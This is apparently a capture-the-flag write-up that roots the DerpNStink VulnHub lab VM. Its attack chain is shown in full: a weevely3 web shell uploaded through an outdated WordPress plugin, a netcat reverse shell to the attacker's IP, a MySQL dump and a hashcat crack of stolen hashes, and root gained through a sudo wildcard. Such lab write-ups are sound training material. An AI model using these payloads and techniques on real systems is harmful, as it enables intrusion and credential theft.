Another day another boot2root VM. This time [DerpNStink](https://www.vulnhub.com/entry/derpnstink-1,221/), it's level is "beginner". To make things short, let's dive in.

* Will be replaced with the ToC, excluding the "Contents" header
{:toc}

## Information

The VM includes 4 flags to find, flags are having format `flag[int])([random string])`. Goal is to get root access to the machine. There are no hints given.

## Flag 1

Obtaining flag 1 is pretty easy. First we do a port scan on the VM:

```
root@kali:~/pentesting/vulnhub/derpnstink# nmap -A -O -n -p- 192.168.159.132
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-05 14:57 CEST

```

We see that ports `21,22,80` are open. Testing **FTP** port:
```
root@kali:~/pentesting/vulnhub/derpnstink# ftp 192.168.159.132
Connected to 192.168.159.132.
220 (vsFTPd 3.0.2)

530 Permission denied.
Login failed.
ftp>
```
Okay, so no access. Let's focus on `:80` then and open it with Firefox.

Oh, we have our 1st flag here: `flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166)`

## Flag 2

Processing further we noticed that a `robots.txt` file was mentioned by the port scan. The content is as below:

```
User-agent: *
Disallow: /php/
Disallow: /temporary/
```

Folder `/php/` gives `403 Forbidden` and `temporary` a `200 OK` with this content:

> try harder!

So, let's search for known directories with `gobuster`:
```
root@kali:~# gobuster -e -t 120 -u http://192.168.159.132/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

http://192.168.159.132/temporary (Status: 301)
=====================================================
```

And for `/php/` we found:
```
http://192.168.159.132/php/info.php (Status: 200)
http://192.168.159.132/php/phpmyadmin (Status: 301)
```
`info.php` is just empty and `phpmyadmin/` is what it says. In `/temporary/` I cannot find anything of interest.
Interesting is the folder `/weblog`, when I open it this is shown:

![](https://i.imgur.com/LbmUyqW.png)

That means we are being redirect to `derpnstink.local`, so let's change our `hosts` file: `echo -e "192.168.159.132 derpnstink.local" | tee -a /etc/hosts`

Let's focus on the vulns which are interesting for us. *file upload* is one of the buzzwords for us, we are seeing that the plugin `Slideshow Gallery` is outdated and working exploits are existing. With that version the uploaded file type won't be checked. There is a nice rule if you code:

> never trust the user

This means you have to check all inputs you get from a user. Really, do it!  
[Here](https://www.exploit-db.com/exploits/34681/) is a Python script to upload a file via a vulnerability. Hooray!
To gain access to the server's system I'll upload a PHP shell which is able to get a working shell on the system. I use [weevely3](https://github.com/epinna/weevely3) to gain that goal. This a very tiny shell to where I will connect. We use it like that in our scenario:
```
root@kali:~/tools/weevely3# ./weevely.py generate r00t agent.php
Generated 'agent.php' with password 'r00t' of 675 byte size.
```
But wait, we need login credentials to be able to use the exploit. The scan of `wpscan` shows that two users are existing, `admin` and `unclestinky`. With some luck I got `admin:admin`, very secure! Upload the shell:
```
root@kali:~/pentesting/vulnhub/derpnstink# python wp_gallery_slideshow_146_suv.py -u admin -p admin -t http://derpnstink.local/weblog/ -f agent.php
[...]
[+] Username & password ACCEPTED!

[!] Shell Uploaded!
[+] Check url: http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/agent.php (lowercase!!!!)
```
Use it:
```

We have a valid login for *MySQL* here, as `root`. Woot? So we dump all databases on our webshell: `mysqldump --user=root --password=mysql --all-databases > dump.sql` and then download the SQL file. At first I'm searching for a flag (we know the pattern of it):

Hooray, we found our 2nd flag!

## Flag 3

It's half time, we found 2 flags out of 4. At first, let's dig deeper inside the SQL dump.
Interesting might be the passwords for the users.
```
INSERT INTO 'wp_users' VALUES
(1,'unclestinky','$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41','unclestinky','unclestinky@DeRPnStiNK.local','','2017-11-12 03:25:32','1510544888:$P$BQbCmzW/ICRqb1hU96nIVUFOlNMKJM1',0,'unclestinky',''),
(2,'admin','$P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/','admin','admin@derpnstink.local','','2017-11-13 04:29:35','',0,'admin','');
```
We know that `admin` has the password `admin`, as of that I focus on the two password strings of `unclestinky`.
When we use hash type 400 in *hashcat* and using `rockyou.txt` as wordlist (Kali Linux has it in `/usr/share/wordlists/` as compressed file) we'll get: `$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41:wedgie57`

Where to use it then? Let's see which users we have in `/etc/passwd`:
```
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
libuuid
syslog
messagebus
usbmux
dnsmasq
avahi-autoipd
kernoops
rtkit
saned
whoopsie
speech-dispatcher
avahi
lightdm
colord
hplip
pulse
mysql
sshd
stinky
ftp
mrderp
```

Hmm, `stinky`, `unclestinky`. I hardly guess that's the same guy. When I try to login via *SSH* with `stinky:wedgie57` I only get 

> stinky@derpnstink.local: Permission denied (publickey).

We don't have one...  
But! There is the command `su`, with that we are able to switch our identity on the system (terminal based access). When we enter that in our *weevely3* shell it results in an error: `su: must be run from a terminal`. So we need a valid `tty` shell. To check if we are on `tty` just simply enter `tty`:
```
www-data@DeRPnStiNK:/var/www/html/weblog/wp-content/uploads/slideshow-gallery $ tty
not a tty
```
I did not manage to get a proper `tty` terminal inside *weevely3*, neither with `python -c 'import pty; pty.spawn("/bin/sh")'` nor with `/bin/sh -i`. If you want a list of some commands to spawn a `tty` shell look [here](https://netsec.ws/?p=337).  
I got some help from [@eiphunt3r](https://twitter.com/eiphunt3r), he mentioned [this article](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) to gain a tty shell with `socat`. Problem: there is no `socat` on the target machine, also the static binary won't work. `nc` is installed to get a reverse shell, but it's the verson without the option `-e`. Bad, bad. Wait, help is on the way! I found [this article](https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/) regarding a workaround for the missing `-e` parameter. Using it:
first spawn up a listener on your machine: `nc -lvp 4444`. Then throw that command to your *weevely3* shell:
`/bin/sh 0</tmp/backpipe | nc 192.168.159.128 4444 1>/tmp/backpipe`. Well,

> not a tty

No problem! Throwing that in:
```
python -c 'import pty; pty.spawn("/bin/sh")'
$ tty
tty
/dev/pts/19
```

Finally! Now, let's `su`:
```
$ su stinky
su stinky
Password: wedgie57

stinky@DeRPnStiNK:/var/www/html/weblog/wp-content/uploads/slideshow-gallery$ id
<html/weblog/wp-content/uploads/slideshow-gallery$ id                        
uid=1001(stinky) gid=1001(stinky) groups=1001(stinky)
```
We are user `stinky` now. Crawling his home folder we got some files:

* `~/Desktop/flag.txt`: our 3rd flag! (`flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)`)
* `~/Documents/derpissues.pcap`: a packet capture file, we will focus on that later
* `ftp/files/network-logs/derpissues.txt`: a chat log
* `~/ftp/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh/key.txt`: a private key, might be for SSH

## Flag 4

Last flag to obtain. Firstly: with the obtained `key.txt` file we are able to login via SSH as stinky, it's really the private key for the account. So we don't need to jump around spawned shells anymore.

Regarding the chat log we see that `mrderp` deleted his account and `stinky` created it again with a new password. `mrderp` captured the network transmission, that's file `derpissues.pcap`.
Let's open it in **Wireshark**.  
We see a normal capture of the whole traffic which happened for the recorded time. What we might want to see is the event when the account for `mrderp` has been created or when he logged in. There we might see the used password. Good that the session was not encrypted with TLS. When a user logs in, Wordpress uses HTTP method POST, so simply filter for POST methods: `http.request.method == POST`. There we see `/weblog/wp-login.php` as target, the file where Wordpress handles the login request.

Bingo! The used password was `derpderpderpderpderpderpderp`, so why don't try also `su` here?
```
stinky@DeRPnStiNK:~/ftp/files/network-logs$ su mrderp
Password:
mrderp@DeRPnStiNK:/home/stinky/ftp/files/network-logs$ id
uid=1000(mrderp) gid=1000(mrderp) groups=1000(mrderp)
```

Ha! Basic enumeration is looking which `sudo` privileges someone has:
```
mrderp@DeRPnStiNK:/home/stinky/ftp/files/network-logs$ sudo -l
[sudo] password for mrderp:
Matching Defaults entries for mrderp on DeRPnStiNK:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
```
That means that we are able to use all commands as privileged user when we start something in `/home/mrderp/binaries/` which is starting with filename `derpy`.  
I created a simple BASH script for that:
```
#!/bin/bash
/bin/sh -i
```

Running it with `sudo`:
```
mrderp@DeRPnStiNK:~$ sudo /home/mrderp/binaries/derpy_root.sh
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /root
Desktop  Documents  Downloads
# ls /root/Desktop
flag.txt
# cat /root/Desktop/flag.txt
flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)

Congrats on rooting my first VulnOS!

We have our last flag!

## Conclusion

This was a easy boot2root VM, as it says 'beginner' level. We saw that using outdated versions of plugins is a bad thing, just keep them up to date. Also using weak passwords is a bad thing.
And enumeration is the key to success. Overall it was a funny VM which I enjoyed.
